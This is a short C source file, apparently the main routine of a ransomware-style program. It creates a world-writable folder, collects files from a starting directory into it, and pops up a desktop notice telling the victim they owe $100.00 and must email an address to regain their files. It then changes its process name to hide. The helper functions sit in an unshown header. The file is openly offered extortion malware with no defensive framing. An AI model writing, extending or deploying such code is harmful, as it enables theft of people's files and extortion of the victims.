#include "header.h"

int main(int argc, char *argv[]) {

	// Create folder "Files" to store all taken files
	if (mkdir("Files", 0777) < 0 && errno != EEXIST) {
		perror("mkdir failed");
		exit(EXIT_FAILURE);
	}
	chmod("Files", 0777);
	// Path of "Files" directory in current working directory
	getcwd(copyToDir, sizeof(copyToDir));
	strcat(copyToDir, "/Files");
	
	/* FIRST PARAM OF OPENDIR IS THE DIRECTORY TO START OUT WITH */
	openDir("test", 0);

	char command[100], msg[1000];

	strcpy(command,"notify-send ");
	strcpy(msg,"\"You have been GOATED. To regain access to you files, you owe $100.00. Email ihavebeengoated@gmail.com for next steps.\"");
	strcat(command,msg);

	// Send system message
	system(command);

	// Give permission to access stolen files
	givePermission();

	changeProcessName(argv);
	return 0;
}
